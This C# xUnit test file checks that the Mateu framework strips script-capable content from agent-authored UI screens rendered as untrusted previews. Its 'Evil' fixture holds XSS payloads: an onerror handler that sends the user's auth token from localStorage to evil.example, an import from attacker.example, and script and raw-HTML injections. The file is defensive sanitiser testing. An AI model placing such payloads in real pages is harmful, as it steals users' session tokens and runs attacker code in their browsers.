using System.Text.Json;
using System.Text.Json.Nodes;
using System.Text.Json.Serialization;
using System.Text.RegularExpressions;
using Mateu.Core;
using Mateu.Dtos;
using Xunit;

namespace Mateu.Tests;

/// <summary>NB1: a screen an AGENT authored is untrusted — the shells render it through
/// <c>__preview__</c> with <c>_untrusted: true</c>, and nothing in what comes back can run script in
/// the user's tab. The rules are the shared cases of <c>conformance/untrusted/cases.json</c> (also
/// Java, Python, libs/mateu, Redwood).</summary>
public class UntrustedPreviewTests
{
    static readonly JsonSerializerOptions Json = new(JsonSerializerDefaults.Web)
    {
        DefaultIgnoreCondition = JsonIgnoreCondition.Never,
        Encoder = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping,
    };

    static JsonArray Cases()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null && !Directory.Exists(Path.Combine(dir.FullName, "conformance", "untrusted"))) dir = dir.Parent;
        var corpus = JsonNode.Parse(File.ReadAllText(Path.Combine(dir!.FullName, "conformance", "untrusted", "cases.json")))!;
        return corpus["cases"]!.AsArray();
    }

    [Fact]
    public void The_shared_cases_hold()
    {
        var cases = Cases();
        Assert.True(cases.Count > 5);
        foreach (var c in cases)
        {
            var actual = UntrustedDefinition.Neutralize(c!["input"]);
            Assert.True(JsonNode.DeepEquals(c["expected"], actual), $"{c["name"]}: {actual?.ToJsonString()}");
        }
    }

    const string Evil = """
        type: VerticalLayout
        content:
          - type: Text
            text: "Generated by the agent"
          - type: Element
            name: img
            attributes:
              src: x.png
              onerror: "fetch('https://evil.example/'+localStorage.__mateu_auth_token)"
              import: https://attacker.example/x.js
          - type: Element
            name: div
            html: true
            content: "<img src=x onerror=alert(1)>"
          - type: Element
            name: script
            content: alert(1)
        """;

    const string Benign = """
        type: VerticalLayout
        content:
          - type: Text
            text: "Hi"
          - type: FormField
            id: email
            dataType: string
            label: "Email"
            required: true
          - type: Button
            label: "Save"
            actionId: "save"
          - type: Card
            title: "A card"
            content:
              - type: Badge
                text: "ok"
          - type: Grid
            id: g
            columns:
              - type: GridColumn
                id: name
                label: Name
        """;

    static string Preview(string yaml, bool untrusted)
    {
        var parameters = new Dictionary<string, object?> { ["_yaml"] = JsonSerializer.SerializeToElement(yaml) };
        if (untrusted) parameters["_untrusted"] = JsonSerializer.SerializeToElement(true);
        var inc = new SyncHandler(new MateuRegistry(typeof(UntrustedPreviewTests).Assembly)).Handle(new RunActionRqDto
        {
            ActionId = "__preview__", Route = "", ConsumedRoute = "_empty", Parameters = parameters,
        });
        return JsonSerializer.Serialize(inc, Json);
    }

    [Fact]
    public void An_untrusted_preview_keeps_nothing_script_capable_and_renders_the_rest()
    {
        var wire = Preview(Evil, true);
        Assert.Contains("Generated by the agent", wire);
        Assert.Contains("x.png", wire);
        Assert.DoesNotContain("\"onerror\"", wire);
        Assert.DoesNotContain("attacker.example", wire);
        Assert.DoesNotContain("\"script\"", wire);
        Assert.DoesNotContain("\"html\":true", wire);
    }

    [Fact]
    public void The_authors_own_preview_renders_as_written()
    {
        var wire = Preview(Evil, false);
        Assert.Contains("\"onerror\"", wire);
        Assert.Contains("\"html\":true", wire);
    }

    [Fact]
    public void A_definition_with_nothing_to_take_out_comes_back_identical()
    {
        static string Ids(string s) => Regex.Replace(s, "\"id\":\"[0-9a-f-]{36}\"", "\"id\":\"x\"");
        Assert.Equal(Ids(Preview(Benign, false)), Ids(Preview(Benign, true)));
    }
}
